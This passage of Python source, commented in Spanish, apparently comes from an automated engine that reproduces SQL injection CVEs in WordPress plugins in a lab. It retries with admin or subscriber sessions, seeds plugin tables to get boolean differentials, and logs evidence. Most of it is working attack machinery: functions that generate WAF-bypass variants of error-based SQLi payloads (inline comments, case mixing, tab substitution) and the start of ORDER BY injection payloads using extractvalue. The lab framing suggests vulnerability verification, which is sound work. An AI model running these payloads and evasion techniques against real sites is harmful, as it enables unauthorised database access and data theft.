            # Rebuild send() with the new method
            def send(val, _m=m, _params=base_params, _ep=endpoint, _sess=_attack_sess,
                     _bu=boot.site_url, _jb=json_body):
                _p = {**_params, sqli_param: val}
                return _http_request(_m, _bu + _ep, timeout=15,
                                     data=_p if _m != "GET" else None,
                                     params=_p if _m == "GET" else None,
                                     session=_sess, json_body=_jb)
            try:
                base_resp = send(orig_value)
            except Exception as e:
                res.detail = f"la peticion de control fallo tras method rotation: {e}"
                return res
        # If the control response contains a MySQL ORDER BY error, the LLM-supplied default
        # value for the sqli_param is not a valid column name. Scan the plugin source for the
        # ORDER BY sink to find the right fallback values, then try them before giving up.
        _ORDER_BY_ERR_RE = re.compile(
            r"Unknown column|ORDER BY|You have an error in your SQL syntax|wpdb error", re.I)
        if _ORDER_BY_ERR_RE.search(base_resp.text or ""):
            # Build candidate safe values: scan plugin source for valid sortby options
            _sort_candidates: list = []
            if plugin_source_dir and os.path.isdir(plugin_source_dir):
                _sortby_re = re.compile(
                    r"(?:elseif|case|==|===)\s*[\(\s]*['\"]?([\w]+)['\"]?\s*[\)]*\s*(?:===|==)\s*\$sortby"
                    r"|sortby.*?==.*?['\"](\w+)['\"]"
                    r"|['\"](\w+)['\"].*?==.*?sortby",
                    re.I)
                # Busca ORDER BY seguido de un nombre de columna (con o sin prefijo de tabla)
                _order_by_col_re = re.compile(
                    r"ORDER BY\s+(?:\w+\.)?(\w+)", re.I)
                # Busca whitelist de columnas: in_array($col, ['a', 'b']) o similar
                _whitelist_re = re.compile(
                    r"in_array\s*\(\s*\$\w+\s*,\s*(?:array\s*)?\(\s*(.*?)\)", re.I | re.DOTALL)
                for _root_s, _, _files_s in os.walk(plugin_source_dir):
                    for _fn_s in _files_s:
                        if not _fn_s.endswith(".php"): continue
                        try:
                            _fc_s = open(os.path.join(_root_s, _fn_s),
                                         encoding="utf-8", errors="replace").read()
                        except Exception: continue
                        if "ORDER BY" not in _fc_s.upper(): continue
                        for _m_s in _order_by_col_re.finditer(_fc_s):
                            _col = _m_s.group(1)
                            if _col.isidentifier() and len(_col) >= 2 and _col not in _sort_candidates:
                                _sort_candidates.append(_col)
                        # Extrae valores de whitelists explícitas de columnas
                        for _wm in _whitelist_re.finditer(_fc_s):
                            for _quoted in re.findall(r"['\"]([a-zA-Z_]\w{0,30})['\"]", _wm.group(1)):
                                if _quoted.isidentifier() and _quoted not in _sort_candidates:
                                    _sort_candidates.append(_quoted)
            # universal fallback list: WP user tables + columnas comunes de plugins
            for _cand in ("id", "ID", "file_id", "post_id", "user_id",
                          "name", "title", "filename", "slug", "date", "created_at",
                          "user_login", "user_registered", "display_name", "registered"):
                if _cand not in _sort_candidates:
                    _sort_candidates.append(_cand)
            _fixed = False
            for _cand in _sort_candidates:
                try:
                    _test_resp = send(_cand)
                except Exception:
                    continue
                if not _ORDER_BY_ERR_RE.search(_test_resp.text or ""):
                    orig_value = _cand
                    base_resp = _test_resp
                    step(f"valor de control para '{sqli_param}' corregido a '{_cand}' (valor LLM "
                         f"causaba error ORDER BY; hallado escaneando el source del plugin)")
                    _fixed = True
                    break
            if not _fixed:
                step(f"[WARN] valor de control '{orig_value}' produce error ORDER BY en "
                     f"'{sqli_param}' y ningun candidato lo corrigio -- continuando con la "
                     f"respuesta de error como baseline (el diferencial puede ser invalido)")
        base_len = len(base_resp.text or "")
        # Si la respuesta de control indica falta de permisos, reintentar con admin_sess.
        # Dos variantes:
        #  a) WordPress admin-ajax devuelve "-1"/"0" cuando el action requiere privilegios
        #  b) /wp-admin/* pages redirigen al subscriber a wp-login.php (302 o HTML con login form)
        _ctrl_body_raw = (base_resp.text or "").strip()
        _ep_lower_sqli = (endpoint or "").lower()
        _is_admin_ep = "admin-ajax.php" in _ep_lower_sqli or "/wp-admin/" in _ep_lower_sqli
        _login_redirect = (
            base_resp.status_code in (301, 302, 303, 307, 308)
            or ("wp-login.php" in (base_resp.text or "")
                and "<html" in (base_resp.text or "").lower())
        )
        _wp_access_denied = base_resp.status_code in (401, 403)
        # Bug fix: HTTP 400 on AJAX endpoints means wrong session/params — also try admin
        _wp_bad_request = base_resp.status_code == 400
        _needs_admin_retry = (
            not _anon_attack and boot.admin_sess and _is_admin_ep and
            (_ctrl_body_raw in ("-1", "0") or _login_redirect or _wp_access_denied
             or _wp_bad_request)
        )
        if _needs_admin_retry:
            _reason = ("'-1'/'0'" if _ctrl_body_raw in ("-1", "0")
                       else f"redirect ({base_resp.status_code}) / login page")
            step(f"respuesta control es {_reason} -- el endpoint requiere admin; "
                 f"reintentando con sesion de admin...")
            _attack_sess = boot.admin_sess
            try:
                base_resp = send(orig_value)
                base_len = len(base_resp.text or "")
                _ctrl_body_raw = (base_resp.text or "").strip()
                if _ctrl_body_raw in ("-1", "0") or (base_resp.status_code >= 300 and base_resp.status_code < 400):
                    step("[WARN] respuesta sigue sin acceso con admin -- posiblemente "
                         "accion invalida o endpoint bloqueado")
                else:
                    step(f"admin session funciona: respuesta control {base_len} bytes, "
                         f"usando admin para todos los payloads")
                    res.evidence["sqli_sesion_admin"] = True
            except Exception:
                pass
        # REST endpoints (/wp-json/) que responden 401/403 con sesion anonima:
        # intentar con sesion de subscriber antes de continuar con payloads.
        # Muchos CVEs autenticados requieren cualquier rol (subscriber) para acceder
        # al REST endpoint -- el engine estaba descartandolos por 401 sin reintentar.
        _is_rest_ep = "/wp-json/" in endpoint
        _needs_rest_auth_retry = (
            _is_rest_ep and _wp_access_denied and
            not _needs_admin_retry and
            boot.sub_sess is not None
        )
        if _needs_rest_auth_retry:
            step(f"REST endpoint retornó {base_resp.status_code} anonimamente -- "
                 f"reintentando con sesión de subscriber (autenticado)...")
            _attack_sess_rest_saved = _attack_sess
            _attack_sess = boot.sub_sess
            try:
                base_resp = send(orig_value)
                base_len = len(base_resp.text or "")
                _ctrl_body_raw = (base_resp.text or "").strip()
                if base_resp.status_code in (401, 403):
                    step(f"[WARN] REST endpoint sigue retornando {base_resp.status_code} "
                         f"con subscriber -- probando con admin...")
                    _attack_sess = boot.admin_sess
                    base_resp = send(orig_value)
                    base_len = len(base_resp.text or "")
                    _ctrl_body_raw = (base_resp.text or "").strip()
                    if base_resp.status_code in (401, 403):
                        step("[WARN] REST endpoint sigue inaccesible con admin -- "
                             "posible endpoint bloqueado o requiere nonce específico")
                        _attack_sess = _attack_sess_rest_saved
                    else:
                        step(f"admin session funciona para REST endpoint: {base_len} bytes")
                        res.evidence["sqli_sesion_admin"] = True
                else:
                    step(f"subscriber session funciona para REST endpoint: {base_len} bytes")
                    res.evidence["sqli_sesion_subscriber"] = True
            except Exception:
                _attack_sess = _attack_sess_rest_saved
        # Si la respuesta de control es vacia o muy pequeña (<= 10 bytes, tipicamente '[]', 'null',
        # '{}', '0', ''), el endpoint probablemente necesita datos en la DB para producir diferencial.
        # Intentar sembrar filas minimas en las tablas personalizadas del plugin, luego reintentar
        # la peticion de control. Confirmado como causa raiz de CVE-2024-3605 (WP Hotel Booking),
        # CVE-2025-22785 (Course Booking), CVE-2025-6970 (Events Manager), CVE-2024-9796 (WP Advanced Search).
        _ctrl_body = (base_resp.text or "").strip()
        # Detectar respuesta JSON con datos vacíos: {"data": [], "success": true}
        # → el plugin responde correctamente pero no hay filas en la tabla → seed needed
        _ctrl_has_empty_data = False
        try:
            import json as _json_seed
            _ctrl_parsed = _json_seed.loads(_ctrl_body)

            def _has_empty_collection(obj, depth=0):
                """Recursively check if the JSON structure contains any empty list/dict."""
                if depth > 4:
                    return False
                if isinstance(obj, list):
                    return len(obj) == 0 or (len(obj) > 0 and all(
                        _has_empty_collection(x, depth + 1) for x in obj[:3]))
                if isinstance(obj, dict):
                    if len(obj) == 0:
                        return True
                    for v in obj.values():
                        if isinstance(v, (list, dict)) and _has_empty_collection(v, depth + 1):
                            return True
                    # Numeric zero/false for data/count/total/items keys → semantically empty
                    for key in ("data", "items", "results", "rows", "records",
                                "count", "total", "num", "hits"):
                        if key in obj and obj[key] in (0, False, None, [], {}):
                            return True
                return False

            _ctrl_has_empty_data = _has_empty_collection(_ctrl_parsed)
        except Exception:
            pass
        _plugin_tables = _detect_plugin_tables(plugin_source_dir)
        # Lazy-create tables: some plugins only run dbDelta() on the first HTTP request to
        # their endpoint (not on activation). If we try to seed BEFORE the first real request,
        # the tables don't exist yet. Strategy: if the initial control response is empty AND
        # no plugin tables were found by static analysis, fire the endpoint once to trigger
        # dbDelta, then re-scan MySQL for newly created tables.
        if (not _plugin_tables and
                (base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", "")
                 or _ctrl_has_empty_data)):
            try:
                step("tablas no detectadas + respuesta vacia: disparando endpoint para activar "
                     "creacion lazy de tablas (dbDelta on first request)...")
                send(orig_value)  # trigger dbDelta side-effect
            except Exception:
                pass
            # Re-scan MySQL for tables that now exist
            if slug:
                _slug_clean_lazy = re.sub(r'[^a-z0-9]', '', slug.lower())
                _lazy_tables_raw = lab.exec_mysql(
                    "SELECT table_name FROM information_schema.tables "
                    "WHERE table_schema=DATABASE() AND table_name LIKE 'wp_%' "
                    "AND table_name NOT IN "
                    "('wp_posts','wp_postmeta','wp_terms','wp_term_taxonomy',"
                    "'wp_term_relationships','wp_options','wp_users','wp_usermeta',"
                    "'wp_comments','wp_commentmeta','wp_links') "
                    "ORDER BY table_name;",
                    boot.db_pw) or ""
                _lazy_tables = [
                    t.strip().lstrip('wp_').strip()
                    for t in _lazy_tables_raw.strip().split('\n')
                    if t.strip() and not t.strip().startswith('table_name')
                ]
                if _lazy_tables:
                    _plugin_tables = _lazy_tables
                    step(f"tablas lazy-creadas detectadas post-request: {_lazy_tables[:5]}")

        _needs_seed = (base_len <= 10
                       or _ctrl_body in ("[]", "null", "{}", "0", "false", "")
                       or _ctrl_has_empty_data
                       or bool(_plugin_tables))
        if _needs_seed:
            if base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", "") or _ctrl_has_empty_data:
                step("respuesta control vacia/minima -- intentando seed data en tablas del plugin para "
                     "producir diferencial booleano...")
            else:
                step("plugin con tablas propias detectado -- intentando seed data para garantizar "
                     "diferencial booleano aunque el control ya devuelva datos...")
            # Fallback: buscar tablas en MySQL que contengan el slug del plugin en su nombre
            if not _plugin_tables and slug:
                _slug_clean = re.sub(r'[^a-z0-9]', '', slug.lower())
                _mysql_tables_raw = lab.exec_mysql(
                    f"SELECT table_name FROM information_schema.tables "
                    f"WHERE table_schema=DATABASE() AND table_name LIKE 'wp_%{_slug_clean}%';",
                    boot.db_pw)
                if _mysql_tables_raw:
                    _mysql_tables = [
                        t.strip().lstrip('wp_') for t in _mysql_tables_raw.strip().split('\n')
                        if t.strip().startswith('wp_') and t.strip() != 'wp_'
                    ]
                    if _mysql_tables:
                        _plugin_tables = _mysql_tables
                        step(f"tablas detectadas via MySQL LIKE query: {_mysql_tables}")
            # Broader fallback: when slug-LIKE found nothing (short plugin table prefixes like
            # hb_ for hotel-booking, cbs_ for course-booking), collect ALL custom non-core
            # WP tables. This catches plugins that use abbreviation-based prefixes that don't
            # match the full plugin slug.
            _WP_CORE_TABLES = {
                "posts", "postmeta", "terms", "term_taxonomy", "term_relationships",
                "options", "users", "usermeta", "comments", "commentmeta", "links",
            }
            if not _plugin_tables:
                try:
                    _all_custom_raw = lab.exec_mysql(
                        "SELECT table_name FROM information_schema.tables "
                        "WHERE table_schema=DATABASE() AND table_name LIKE 'wp_%';",
                        boot.db_pw) or ""
                    _all_custom = [
                        t.strip()[3:]  # strip 'wp_'
                        for t in _all_custom_raw.strip().split('\n')
                        if (t.strip().startswith('wp_')
                            and t.strip()[3:] not in _WP_CORE_TABLES)
                    ]
                    if _all_custom:
                        _plugin_tables = _all_custom
                        step(f"tablas custom (broader fallback): {_all_custom[:8]}")
                except Exception:
                    pass
            if _plugin_tables:
                res.evidence["tablas_plugin_detectadas"] = _plugin_tables[:12]
                _seeded = _seed_plugin_tables(lab, boot.db_pw, _plugin_tables, step,
                                             sqli_param=sqli_param,
                                             sqli_param_value=orig_value,
                                             plugin_source_dir=plugin_source_dir)
                if _seeded:
                    _preseed_len = base_len
                    _preseed_body = _ctrl_body
                    try:
                        base_resp = send(orig_value)
                        base_len = len(base_resp.text or "")
                        _ctrl_body = (base_resp.text or "").strip()
                        step(f"respuesta post-seed: {base_len} bytes -- "
                             f"{'diferencial posible' if base_len > 10 else 'sigue vacia, continuando'}")
                        # Si tras el primer seed la respuesta sigue vacia/minima, hacer un re-scan
                        # MySQL para capturar tablas creadas LAZILY por el primer request de control
                        # (p.ej. rsvpmaker_guest_email la crea via dbDelta en el primer endpoint hit,
                        # pero no estaba en MySQL cuando el static-analysis scan corrio).
                        if (base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", "")
                                ) and slug:
                            try:
                                _slug_clean2 = re.sub(r'[^a-z0-9]', '', slug.lower())
                                _mysql2_raw = lab.exec_mysql(
                                    f"SELECT table_name FROM information_schema.tables "
                                    f"WHERE table_schema=DATABASE() AND table_name LIKE 'wp_%{_slug_clean2}%';",
                                    boot.db_pw) or ""
                                _mysql2_tables = [
                                    t.strip()[3:] for t in _mysql2_raw.strip().split('\n')
                                    if t.strip().startswith('wp_') and t.strip() != 'wp_'
                                ]
                                # Solo seedear tablas que NO sembramos aun (evitar re-INSERT en las ya sembradas)
                                _new_tables = [t for t in _mysql2_tables if t not in _plugin_tables]
                                step(f"re-scan MySQL: found={_mysql2_tables[:5]} new={_new_tables[:5]}")
                                if _new_tables:
                                    _seeded2 = _seed_plugin_tables(lab, boot.db_pw, _new_tables, step,
                                                                   sqli_param=sqli_param,
                                                                   sqli_param_value=orig_value,
                                                                   plugin_source_dir=plugin_source_dir)
                                    if _seeded2:
                                        base_resp = send(orig_value)
                                        base_len = len(base_resp.text or "")
                                        _ctrl_body = (base_resp.text or "").strip()
                                        step(f"respuesta post-reseed: {base_len} bytes -- "
                                             f"{'diferencial posible' if base_len > 10 else 'sigue vacia'}")
                            except Exception as _rescan_exc:
                                step(f"[WARN] re-scan MySQL fallo: {_rescan_exc!r:.100}")
                        # CPT seed fallback: si la respuesta sigue vacia despues del seed de tablas,
                        # el plugin puede usar wp_posts con un post_type personalizado (eventos,
                        # cursos, habitaciones, etc.). Detectar el CPT del plugin desde su codigo
                        # fuente y crear uno o dos posts con wp-cli.
                        if (base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", "")
                                ) and plugin_source_dir:
                            try:
                                import glob as _glob2
                                _cpt_re = re.compile(
                                    r"register_post_type\s*\(\s*['\"]([a-z0-9_\-]{3,40})['\"]",
                                    re.I)
                                _cpts_found = []
                                for _phpf in _glob2.glob(
                                        str(plugin_source_dir) + "/**/*.php", recursive=True):
                                    try:
                                        _phpc = open(_phpf, encoding="utf-8", errors="replace"
                                                     ).read(60_000)
                                    except OSError:
                                        continue
                                    for _cm in _cpt_re.finditer(_phpc):
                                        _ct = _cm.group(1)
                                        if _ct not in _cpts_found and _ct != "attachment":
                                            _cpts_found.append(_ct)
                                if _cpts_found:
                                    step(f"CPTs detectados en source: {_cpts_found[:4]} — "
                                         f"creando posts de seed con wp-cli...")
                                    # Scan plugin source for required post meta keys on the CPT
                                    # (get_post_meta($id, 'KEY', ...) patterns) so created posts
                                    # have the meta expected by the plugin's query filters.
                                    _meta_scan_re = re.compile(
                                        r"get_post_meta\s*\([^,]+,\s*['\"]([A-Za-z0-9_]{3,50})['\"]",
                                        re.I)
                                    _required_meta: dict = {}  # key -> default value
                                    for _phpf2 in _glob2.glob(
                                            str(plugin_source_dir) + "/**/*.php", recursive=True):
                                        try:
                                            _phpc2 = open(_phpf2, encoding="utf-8",
                                                          errors="replace").read(60_000)
                                        except OSError:
                                            continue
                                        for _mm in _meta_scan_re.finditer(_phpc2):
                                            _mk = _mm.group(1)
                                            if _mk not in _required_meta and len(_required_meta) < 10:
                                                # Priority: if this meta key IS the sqli_param (or contains it),
                                                # seed with the original attack value — this handles
                                                # WP Hotel Booking room_type=standard, etc.
                                                _mk_lower = _mk.lower()
                                                _sp_lower = (sqli_param or "").lower()
                                                if _sp_lower and (_mk_lower == _sp_lower or
                                                                   _sp_lower in _mk_lower or
                                                                   _mk_lower in _sp_lower):
                                                    _required_meta[_mk] = str(orig_value or "1")
                                                elif any(x in _mk_lower for x in
                                                         ("start", "date", "begin", "time", "stamp")):
                                                    _required_meta[_mk] = "2026-01-01"
                                                elif any(x in _mk_lower for x in
                                                         ("status", "state", "approved", "active")):
                                                    _required_meta[_mk] = "1"
                                                elif any(x in _mk_lower for x in
                                                         ("price", "cost", "amount", "fee", "rate")):
                                                    _required_meta[_mk] = "0"
                                                elif any(x in _mk_lower for x in
                                                         ("type", "kind", "category", "class",
                                                          "room", "spot", "mode", "format")):
                                                    _required_meta[_mk] = str(orig_value or "standard")
                                                elif any(x in _mk_lower for x in
                                                         ("adult", "child", "guest", "people",
                                                          "capacity", "seats", "count", "qty",
                                                          "quantity", "spots")):
                                                    _required_meta[_mk] = "1"
                                                elif any(x in _mk_lower for x in
                                                         ("id", "location", "venue", "place",
                                                          "order", "ref", "post")):
                                                    _required_meta[_mk] = "0"
                                                else:
                                                    _required_meta[_mk] = "1"
                                    for _cpt in _cpts_found[:3]:
                                        try:
                                            _post_id_raw = lab.wp_cli(
                                                "post", "create",
                                                f"--post_type={_cpt}",
                                                f"--post_title=Seed {_cpt} 1",
                                                "--post_status=publish",
                                                "--porcelain",
                                                timeout=15)
                                            _post_id = (_post_id_raw or "").strip()
                                            if _post_id.isdigit() and _required_meta:
                                                for _mk, _mv in list(_required_meta.items())[:6]:
                                                    try:
                                                        lab.wp_cli("post", "meta", "update",
                                                                   _post_id, _mk, _mv, timeout=10)
                                                    except Exception:
                                                        pass
                                        except Exception:
                                            pass
                                    if _required_meta:
                                        step(f"meta seed en posts CPT: {list(_required_meta.keys())[:5]}")
                                    try:
                                        base_resp = send(orig_value)
                                        base_len = len(base_resp.text or "")
                                        _ctrl_body = (base_resp.text or "").strip()
                                        step(f"respuesta post-CPT-seed: {base_len}B "
                                             f"({_cpts_found[:2]}) — "
                                             f"{'diferencial posible' if base_len > 10 else 'sigue vacia'}")
                                    except Exception:
                                        pass
                            except Exception as _cpt_exc:
                                step(f"[WARN] CPT seed fallo: {_cpt_exc!r:.80}")
                        # Autodetect real orig_value from DB: si la respuesta sigue vacia despues
                        # del seed, el sqli_param probablemente apunta a una fila que no existe con
                        # orig_value actual. Tres estrategias:
                        # 1. ID-like param → SELECT id FROM wp_{tbl} ORDER BY id LIMIT 1
                        # 2. Slug/name-like param → SELECT slug/name/title FROM wp_{tbl} LIMIT 1
                        # 3. Numeric default "1" but any param → try the actual DB MIN(id)
                        if base_len <= 10 and _plugin_tables:
                            _id_tables = _plugin_tables[:4]
                            _sqp_lower = sqli_param.lower()
                            _is_id_like = any(h in _sqp_lower for h in
                                              ("id", "num", "code", "ref", "key", "dir",
                                               "ord", "sort", "cat", "type", "cls"))
                            _is_text_like = any(h in _sqp_lower for h in
                                                ("slug", "name", "title", "search", "q",
                                                 "term", "tag", "label", "keyword", "query"))
                            for _id_tbl in _id_tables:
                                try:
                                    if _is_id_like or orig_value in ("", "1"):
                                        _id_raw = lab.exec_mysql(
                                            f"SELECT id FROM wp_{_id_tbl} ORDER BY id LIMIT 1;",
                                            boot.db_pw) or ""
                                        _id_val = _id_raw.strip().split('\n')[-1].strip()
                                        if _id_val.isdigit() and _id_val not in ("0", ""):
                                            orig_value = _id_val
                                            base_params[sqli_param] = orig_value
                                            base_resp = send(orig_value)
                                            base_len = len(base_resp.text or "")
                                            _ctrl_body = (base_resp.text or "").strip()
                                            step(f"orig_value autodetectado desde DB "
                                                 f"(wp_{_id_tbl}.id={orig_value}): "
                                                 f"{base_len}B -- "
                                                 f"{'diferencial posible' if base_len > 10 else 'sigue vacia'}")
                                            if base_len > 10:
                                                break
                                    if _is_text_like and base_len <= 10:
                                        # Pull first non-empty text value from common text columns
                                        for _txt_col in ("name", "slug", "title", "post_title"):
                                            _txt_raw = lab.exec_mysql(
                                                f"SELECT {_txt_col} FROM wp_{_id_tbl} "
                                                f"WHERE {_txt_col} IS NOT NULL LIMIT 1;",
                                                boot.db_pw) or ""
                                            _txt_val = _txt_raw.strip().split('\n')[-1].strip()
                                            if _txt_val and len(_txt_val) > 1 and not _txt_val.startswith("ERROR"):
                                                orig_value = _txt_val
                                                base_params[sqli_param] = orig_value
                                                base_resp = send(orig_value)
                                                base_len = len(base_resp.text or "")
                                                _ctrl_body = (base_resp.text or "").strip()
                                                step(f"orig_value texto autodetectado desde DB "
                                                     f"(wp_{_id_tbl}.{_txt_col}='{orig_value[:40]}'): "
                                                     f"{base_len}B -- "
                                                     f"{'diferencial posible' if base_len > 10 else 'sigue vacia'}")
                                                if base_len > 10:
                                                    break
                                        if base_len > 10:
                                            break
                                except Exception:
                                    continue

                        # Si el seed inflO la respuesta mas de 20x respecto al baseline pre-seed pequeno,
                        # la fila seeded esta disparando codigo adicional que crashea el plugin
                        # (p.ej. WooCommerce, payment gateway no instalado): la injection no podria
                        # distinguirse del control porque ambas devuelven la misma pagina de error.
                        # Revertir al baseline pre-seed preserva el diferencial real (seed row present
                        # → crash → misma respuesta; sin row → var_dump/codigo normal → distinta respuesta).
                        _SEED_BLOAT_FACTOR = 20
                        if (_preseed_len > 0 and base_len > _preseed_len * _SEED_BLOAT_FACTOR
                                and base_len > 10000):
                            step(f"[WARN] seed data inflO la respuesta de {_preseed_len}B -> {base_len}B "
                                 f"(factor >{_SEED_BLOAT_FACTOR}x) — el plugin crashea al procesar la fila "
                                 f"seeded (p.ej. WooCommerce no instalado). Revertiendo al baseline "
                                 f"pre-seed ({_preseed_len}B) para preservar el diferencial.")
                            base_len = _preseed_len
                            _ctrl_body = _preseed_body
                    except Exception:
                        pass
        # recorte del cuerpo real de la peticion de CONTROL (sin inyeccion) -- confirmado en
        # vivo, CVE-2024-3552: un negativo sin esto no se puede diagnosticar sin relanzar el
        # ataque a mano; con el cuerpo real delante se ve al momento si el servidor esta
        # devolviendo lo esperado (p.ej. no un error fatal de PHP, no un redirect inesperado...)
        # para la peticion mas simple de todas, ANTES de intentar nada mas complicado.
        res.evidence["respuesta_control_recorte"] = (base_resp.text or "")[:300]
        # Log del cuerpo de control para diagnóstico en caso de fallo
        _ctrl_preview = (base_resp.text or "")[:120].replace('\n', ' ').strip()
        step(f"respuesta control ({base_resp.status_code}, {base_len}B): {_ctrl_preview}")
        # Detectar respuesta de control vacia: indica que el endpoint no tiene datos y el
        # diferencial boolean fallara. Registrar en evidence para que el analista sepa que
        # necesita seed_sql, y continuar de todas formas (error-based/union pueden funcionar
        # aunque la respuesta de control sea vacia).
        _ctrl_text_stripped = (base_resp.text or "").strip()
        _empty_resp = _ctrl_text_stripped in ("", "[]", "{}", "null", "false")
        if _empty_resp or base_len < 8:
            step("ADVERTENCIA: respuesta de control vacia o casi vacia — el diferencial boolean "
                 "probablemente fallara; si el endpoint necesita datos en tablas custom, "
                 "aniade un campo seed_sql al JSON del CVE con los INSERT necesarios")
            res.evidence["control_vacio"] = True
            res.evidence["control_vacio_body"] = _ctrl_text_stripped[:100]
        # Nonce fast-fail: when the control response shows a nonce/auth failure, none
        # of the subsequent 400+ SQLi payloads can succeed. Abort early to save budget.
        # Hint for the analyst: add nonce_action to the CVE JSON.
        _ctrl_causa_pre = _quick_causa(_ctrl_text_stripped, base_resp.status_code)
        if _ctrl_causa_pre == "nonce":
            _nonce_params_ff = [k for k in base_params
                                if any(h in k.lower() for h in ("nonce", "security", "token"))]
            step(f"ABORT nonce fast-fail: control dice '{_ctrl_text_stripped[:80]}' — "
                 f"el endpoint rechaza por nonce incorrecto; "
                 f"ninguna tecnica SQLi puede trabajar si el control esta bloqueado "
                 f"(hint: anadir nonce_action al JSON del CVE con la accion del plugin)")
            res.evidence["nonce_fastfail"] = True
            res.evidence["nonce_fastfail_response"] = _ctrl_text_stripped[:200]
            res.evidence["nonce_params"] = _nonce_params_ff
            res.detail = (f"Control rechazado por nonce: '{_ctrl_text_stripped[:100]}'. "
                          f"Anadir 'nonce_action' (ej. 'um-frontend-nonce') al JSON del CVE.")
            return res
        # Captura visual HTTP: peticion de control para el informe paso a paso
        step("capturando pantalla: peticion de control HTTP (sin inyeccion, respuesta base)...")
        _ctrl_url = boot.base_url + endpoint
        _ctrl_png = _screenshot_response(_ctrl_url, m, base_resp.status_code,
                                         (base_resp.text or "")[:2000])
        if _ctrl_png:
            boot.shots.append({
                "png_b64": _ctrl_png,
                "caption_es": (f"Petición de control ({m} {endpoint}) — sin inyección, "
                               f"respuesta base del servidor. Código HTTP {base_resp.status_code}. "
                               f"Esta respuesta sirve como línea base para detectar diferencias "
                               f"causadas por la inyección."),
                "caption_en": (f"Control request ({m} {endpoint}) — no injection payload, "
                               f"server baseline response. HTTP code {base_resp.status_code}. "
                               f"This response is the baseline against which injection-caused "
                               f"differences are measured."),
                "url": _ctrl_url,
            })
        version_noise = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", base_resp.text or ""))
        def _is_plausible_mysql_ver(v: str) -> bool:
            """Acepta solo versiones que se parecen a MySQL/MariaDB reales.
            MySQL: 5.5.x-5.7.x, 8.0.x-8.4.x, 9.x.x
            MariaDB: 10.x.x, 11.x.x
            Rechaza: PHP (7.x.x, 8.x.x con minor>4), Node, WP, plugin versions, etc.
            La heuristica correcta: MySQL reporta major 5 (patch≥50), 8, 9; MariaDB reporta 10/11.
            """
            try:
                parts = v.split(".")
                major = int(parts[0])
                minor = int(parts[1]) if len(parts) > 1 else 0
                # MySQL 5.5 – 5.7
                if major == 5 and 5 <= minor <= 7:
                    return True
                # MySQL 8.x (8.0 – 8.4), 9.x
                if major in (8, 9) and minor <= 9:
                    return True
                # MariaDB 10.x, 11.x (minor puede ser grande: 10.11, 11.4, etc.)
                if major in (10, 11):
                    return True
                return False
            except (ValueError, IndexError):
                return False
        # contextos de inyeccion: el query real puede envolver el valor en comillas simples,
        # dobles, un parentesis, o nada (contexto numerico) -- probar los cuatro en vez de asumir
        # uno solo evita fallar por adivinar mal el contexto, no por no haber inyeccion de verdad.
        contexts = ["'", '"', "", "')", '")']
        comments = ["-- -", "#"]

        def _waf_expand_sqli_payloads(orig: str, fn: str, ctx: str, cm: str) -> list:
            """
            Generate WAF-bypass variants of a standard error-based SQLi payload.
            Generic — applies to ALL CVEs. No per-CVE hardcoding.

            Techniques:
            1. Comment-separated keywords: AND extractvalue → AND/**/extractvalue
            2. Case mixing: extractvalue → ExtRaCtVaLuE
            3. MySQL inline comment: extractvalue → /*!50000extractvalue*/
            4. Whitespace variants: space → tab (%09)
            5. Versioned inline comment on SELECT: 0x7e,version() → 0x7e,/*!version*/()
            6. Alternative hex prefix: concat(0x7e → concat(char(126)
            """
            base = f"{orig}{ctx} AND {fn}{cm}"
            variants = []
            # 1. Comment-separated keywords
            variants.append(f"{orig}{ctx}/**/AND/**/{fn}{cm}")
            # 2. Case mixing on function name
            fn_mixed = "".join(c.upper() if i % 2 == 0 else c.lower()
                               for i, c in enumerate(fn))
            variants.append(f"{orig}{ctx} AND {fn_mixed}{cm}")
            # 3. MySQL inline comment bypass (passes WAFs that strip SQL keywords)
            fn_inline = fn.replace("extractvalue", "/*!50000extractvalue*/").replace(
                "updatexml", "/*!50000updatexml*/")
            if fn_inline != fn:
                variants.append(f"{orig}{ctx} AND {fn_inline}{cm}")
            # 4. Tab instead of space (WAFs that only strip literal spaces)
            variants.append(f"{orig}{ctx}\tAND\t{fn}{cm}")
            # 5. Alternative hex: concat(0x7e,version()) → concat(char(126),version())
            fn_char = fn.replace("0x7e,version()", "char(126),version()").replace(
                "0x7e,version()", "char(126),version()")
            if fn_char != fn:
                variants.append(f"{orig}{ctx} AND {fn_char}{cm}")
            # 6. Double URL-encoded injection prefix (for endpoints that URL-decode twice)
            variants.append(f"{orig}{ctx}%20AND%20{fn}{cm}")
            # Remove exact duplicates and the base payload (already tried)
            seen = {base}
            result = []
            for v in variants:
                if v not in seen:
                    seen.add(v)
                    result.append(v)
            return result[:6]  # cap at 6 per combination to bound budget

        def _sqli_encode_variants(payload: str) -> list:
            """
            Returns encoding variants of a SQLi payload for simple string-filter bypass.
            - Comment-separated UNION/SELECT keywords
            - Case mixing on SQL keywords
            - MySQL version comment on function names
            """
            variants = []
            # Comment injection in UNION SELECT
            v1 = re.sub(r'\bUNION\s+SELECT\b', 'UNION/**/SELECT', payload, flags=re.I)
            if v1 != payload:
                variants.append(v1)
            # Case mixing on keywords
            def _mix_case(m):
                w = m.group(0)
                return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(w))
            v2 = re.sub(r'\b(UNION|SELECT|AND|OR|FROM|WHERE)\b', _mix_case, payload)
            if v2 != payload:
                variants.append(v2)
            # Inline comment on extractvalue/updatexml
            v3 = re.sub(r'\b(extractvalue|updatexml)\b',
                        lambda m: f'/*!50000{m.group(0)}*/', payload, flags=re.I)
            if v3 != payload:
                variants.append(v3)
            return [v for v in variants if v != payload][:3]

        # ORDER BY injection fast-path: when sqli_via_orderby=True the vulnerable parameter
        # feeds directly into an ORDER BY clause (not WHERE), so standard error/UNION/boolean/
        # time-based WHERE payloads cannot work. Try ORDER BY techniques first so we don't
        # exhaust the budget on techniques that cannot succeed for this injection class.
        if sqli_via_orderby:
            step("[ORDER BY fast-path] sqli_via_orderby=True — probando ORDER BY injection "
                 "directamente (subconsulta como item de ORDER BY) antes que tecnicas WHERE...")
            _ob_col_prefix = orig_value.strip() if (
                orig_value and re.match(r'^[\w.]+$', orig_value) and len(orig_value) < 40
            ) else "user_login"
            _ob_payloads_fp = [
                f"{_ob_col_prefix},(SELECT extractvalue(1,concat(0x7e,version())))",
